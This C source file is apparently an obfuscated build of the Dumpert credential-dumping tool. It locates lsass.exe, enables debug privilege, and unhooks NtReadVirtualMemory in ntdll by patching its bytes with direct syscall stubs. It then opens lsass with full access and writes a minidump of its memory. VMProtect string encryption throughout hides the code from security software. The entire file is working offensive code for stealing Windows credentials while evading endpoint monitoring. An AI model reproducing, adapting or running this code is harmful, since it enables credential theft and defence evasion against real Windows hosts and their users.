#include "Dumpert.h"

BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
	BYTE AssemblyBytes[] = {0x4C, 0x8B, 0xD1, 0xB8, 0xFF};

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory7SP1;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory80;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		AssemblyBytes[4] = pWinVerInfo->SystemCall;
		ZwWriteVirtualMemory = &ZwWriteVirtualMemory81;
		ZwProtectVirtualMemory = &ZwProtectVirtualMemory81;
	}
	else {
		return FALSE;
	}

	LPVOID lpProcAddress = GetProcAddress(LoadLibraryW(VMProtectDecryptStringW(L"ntdll.dll")), pWinVerInfo->lpApiCall);

	printf(VMProtectDecryptStringA("	[+] %s function pointer at: 0x%p\n"), pWinVerInfo->lpApiCall, lpProcAddress);
	printf(VMProtectDecryptStringA("	[+] %s System call nr is: 0x%x\n"), pWinVerInfo->lpApiCall, AssemblyBytes[4]);
	printf(VMProtectDecryptStringA("	[+] Unhooking %s.\n"), pWinVerInfo->lpApiCall);

	LPVOID lpBaseAddress = lpProcAddress;
	ULONG OldProtection, NewProtection;
	SIZE_T uSize = 10;
	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(VMProtectDecryptStringW(L"	[!] ZwProtectVirtualMemory failed.\n"));
		return FALSE;
	}
	
	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
	if (status != STATUS_SUCCESS) {
		wprintf(VMProtectDecryptStringW(L"	[!] ZwWriteVirtualMemory failed.\n"));
		return FALSE;
	}

	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
	if (status != STATUS_SUCCESS) {
		wprintf(VMProtectDecryptStringW(L"	[!] ZwProtectVirtualMemory failed.\n"));
		return FALSE;
	}

	return TRUE;
}

BOOL GetPID(IN PWIN_VER_INFO pWinVerInfo) {
	pWinVerInfo->hTargetPID = NULL;

	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation10;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
		NtFreeVirtualMemory = &NtFreeVirtualMemory10;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && pWinVerInfo->dwBuildNumber == 7601) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation7SP1;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory7SP1;
		NtFreeVirtualMemory = &NtFreeVirtualMemory7SP1;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation80;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory80;
		NtFreeVirtualMemory = &NtFreeVirtualMemory80;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		ZwQuerySystemInformation = &ZwQuerySystemInformation81;
		NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
		NtFreeVirtualMemory = &NtFreeVirtualMemory81;
	}
	else {
		return FALSE;
	}

	ULONG uReturnLength = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, 0, 0, &uReturnLength);
	if (!status == 0xc0000004) {
		return FALSE;
	}

	LPVOID pBuffer = NULL;
	SIZE_T uSize = uReturnLength;
	status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
	if (status != 0) {
		return FALSE;
	}

	status = ZwQuerySystemInformation(SystemProcessInformation, pBuffer, uReturnLength, &uReturnLength);
	if (status != 0) {
		return FALSE;
	}

	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)
		GetProcAddress(GetModuleHandleW(VMProtectDecryptStringW(L"ntdll.dll")), VMProtectDecryptStringA("RtlEqualUnicodeString"));
	if (RtlEqualUnicodeString == NULL) {
		return FALSE;
	}

	PSYSTEM_PROCESSES pProcInfo = (PSYSTEM_PROCESSES)pBuffer;
	do {
		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &pWinVerInfo->ProcName, TRUE)) {
			pWinVerInfo->hTargetPID = pProcInfo->ProcessId;
			break;
		}
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

	} while (pProcInfo);

	status = NtFreeVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, MEM_RELEASE);

	if (pWinVerInfo->hTargetPID == NULL) {
		return FALSE;
	}

	return TRUE;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = (LPWSTR)VMProtectDecryptStringW(L"SeDebugPrivilege");
	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return FALSE;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


DWORD wmain(DWORD argc, wchar_t* argv[]) {
	

	LPCWSTR lpwProcName = VMProtectDecryptStringW(L"lsass.exe");

	if (sizeof(LPVOID) != 8) {
		wprintf(VMProtectDecryptStringW(L"[!] Sorry, this tool only works on a x64 version of Windows.\n"));
		exit(1);
	}

	if (!IsElevated()) {
		wprintf(VMProtectDecryptStringW(L"[!] You need elevated privileges to run this tool!\n"));
		exit(1);
	}

	SetDebugPrivilege();

	PWIN_VER_INFO pWinVerInfo = (PWIN_VER_INFO)calloc(1, sizeof(WIN_VER_INFO));

	// First set OS Version/Architecture specific values
	OSVERSIONINFOEXW osInfo;
	LPWSTR lpOSVersion;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(VMProtectDecryptStringW(L"ntdll.dll")), VMProtectDecryptStringA("RtlGetVersion"));
	if (RtlGetVersion == NULL) {
		return FALSE;
	}

	wprintf(L"[1] Checking OS version details:\n");
	RtlGetVersion(&osInfo);
	swprintf_s(pWinVerInfo->chOSMajorMinor, _countof(pWinVerInfo->chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
	pWinVerInfo->dwBuildNumber = osInfo.dwBuildNumber;

	// Now create os/build specific syscall function pointers.
	if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"10.0") == 0) {
		lpOSVersion = (LPWSTR)VMProtectDecryptStringW(L"10 or Server 2016");
		wprintf(VMProtectDecryptStringW(L"	[+] Operating System is Windows %ls, build number %d\n"), lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(VMProtectDecryptStringW(L"	[+] Mapping version specific System calls.\n"));
		ZwOpenProcess = &ZwOpenProcess10;
		NtCreateFile = &NtCreateFile10;
		ZwClose = &ZwClose10;
		pWinVerInfo->SystemCall = 0x3F;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
		lpOSVersion = (LPWSTR)VMProtectDecryptStringW(L"7 SP1 or Server 2008 R2");
		wprintf(VMProtectDecryptStringW(L"	[+] Operating System is Windows %ls, build number %d\n"), lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(VMProtectDecryptStringW(L"	[+] Mapping version specific System calls.\n"));
		ZwOpenProcess = &ZwOpenProcess7SP1;
		NtCreateFile = &NtCreateFile7SP1;
		ZwClose = &ZwClose7SP1;
		pWinVerInfo->SystemCall = 0x3C;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
		lpOSVersion = (LPWSTR)VMProtectDecryptStringW(L"8 or Server 2012");
		wprintf(VMProtectDecryptStringW(L"	[+] Operating System is Windows %ls, build number %d\n"), lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(VMProtectDecryptStringW(L"	[+] Mapping version specific System calls.\n"));
		ZwOpenProcess = &ZwOpenProcess80;
		NtCreateFile = &NtCreateFile80;
		ZwClose = &ZwClose80;
		pWinVerInfo->SystemCall = 0x3D;
	}
	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
		lpOSVersion = (LPWSTR)VMProtectDecryptStringW(L"8.1 or Server 2012 R2");
		wprintf(VMProtectDecryptStringW(L"	[+] Operating System is Windows %ls, build number %d\n"), lpOSVersion, pWinVerInfo->dwBuildNumber);
		wprintf(VMProtectDecryptStringW(L"	[+] Mapping version specific System calls.\n"));
		ZwOpenProcess = &ZwOpenProcess81;
		NtCreateFile = &NtCreateFile81;
		ZwClose = &ZwClose81;
		pWinVerInfo->SystemCall = 0x3E;
	}
	else {
		wprintf(VMProtectDecryptStringW(L"	[!] OS Version not supported.\n\n"));
		exit(1);
	}

	wprintf(VMProtectDecryptStringW(L"[2] Checking Process details:\n"));

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), VMProtectDecryptStringA("RtlInitUnicodeString"));
	if (RtlInitUnicodeString == NULL) {
		return FALSE;
	}

	RtlInitUnicodeString(&pWinVerInfo->ProcName, lpwProcName);

	if (!GetPID(pWinVerInfo)) {
		wprintf(VMProtectDecryptStringW(L"	[!] Enumerating process failed.\n"));
		exit(1);
	}

	wprintf(VMProtectDecryptStringW(L"	[+] Process ID of %wZ is: %lld\n"), pWinVerInfo->ProcName, (ULONG64)pWinVerInfo->hTargetPID);
	pWinVerInfo->lpApiCall = VMProtectDecryptStringA("NtReadVirtualMemory");

	if (!Unhook_NativeAPI(pWinVerInfo)) {
		printf(VMProtectDecryptStringA("	[!] Unhooking %s failed.\n"), pWinVerInfo->lpApiCall);
		exit(1);
	}

	wprintf(VMProtectDecryptStringW(L"[3] Create memorydump file:\n"));

	wprintf(VMProtectDecryptStringW(L"	[+] Open a process handle.\n"));
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID uPid = { 0 };

	uPid.UniqueProcess = pWinVerInfo->hTargetPID;
	uPid.UniqueThread = (HANDLE)0;

	NTSTATUS status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
	if (hProcess == NULL) {
		wprintf(VMProtectDecryptStringW(L"	[!] Failed to get processhandle.\n"));
		exit(1);
	}

	// DWORD dwTargetPID = GetProcessId(hProcess);

	BOOL Success = MiniDump(hProcess, (DWORD)pWinVerInfo->hTargetPID);
	if ((!Success))
	{
		wprintf(VMProtectDecryptStringW(L"	[!] Failed to create minidump, error code: %x\n"), GetLastError());
	}
	else {
		wprintf(VMProtectDecryptStringW(L"	[+] Dump succesful.\n"));
	}

	// ZwClose(hDmpFile);
	ZwClose(hProcess);

	return 0;
}